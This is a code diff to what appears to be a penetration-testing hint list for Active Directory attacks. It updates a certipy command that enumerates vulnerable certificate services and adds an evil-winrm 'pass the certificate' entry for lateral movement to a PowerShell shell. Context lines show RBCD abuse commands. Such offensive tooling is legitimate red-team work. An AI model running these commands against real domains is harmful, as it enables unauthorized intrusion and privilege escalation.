@@ -495,7 +495,7 @@ hints = [
     
     Hint(name='Enumerate AD CS', command='certipy find -u {user}@{domain} -p \'{password}\' -dc-ip {ip}', block='valid credentials', service=None, ports=None,
         tool='certipy', tags='hot', comment='helps if user is Cert Publishers', next_step='adcs configuration'),
-    Hint(name='Enumerate AD CS', command='certipy find -u {user}@{domain} -p \'{password}\' -dc-ip {ip} -vulnerable', block='valid credentials', service=None, ports=None,
+    Hint(name='Enumerate AD CS', command='certipy find -u {user}@{domain} -p \'{password}\' -dc-ip {ip} -stdout -vulnerable', block='valid credentials', service=None, ports=None,
         tool='certipy', tags='hot', comment='helps if user is Cert Publishers', next_step='adcs configuration'),
 
     Hint(name='Enumerate Azure AD connect', command='cme ldap {ip} -u {user} -p {password} -M get-desc-users | grep -i MSOL', block='valid credentials', service='LDAP', ports='389 636 3268 3269',
@@ -963,6 +963,8 @@ hints = [
         tool='certipy', tags=None, comment='pkinit', next_step='lateral move (Pass the ticket)'),
     Hint(name='Pass the Certificate (PTC) (pfx)', command='certipy auth -pfx {crt_file} -ldap-shell     add_computer     set_rbcd', block='lateral move', service=None, ports=None,
         tool='certipy', tags=None, comment='Schannel', next_step='kerberos delegation (RBCD)'),
+    Hint(name='Pass the certificate (PTC) (pfx)', command='evil-winrm -i {ip} -u {user} -c {crt} -k {key}', block='lateral move', service='WinRM', ports='5985 5986',
+        tool='evil-winrm', tags=None, comment='PS shell', next_step='privilege escalation, administrator access'),
 
     # Domain admin
 
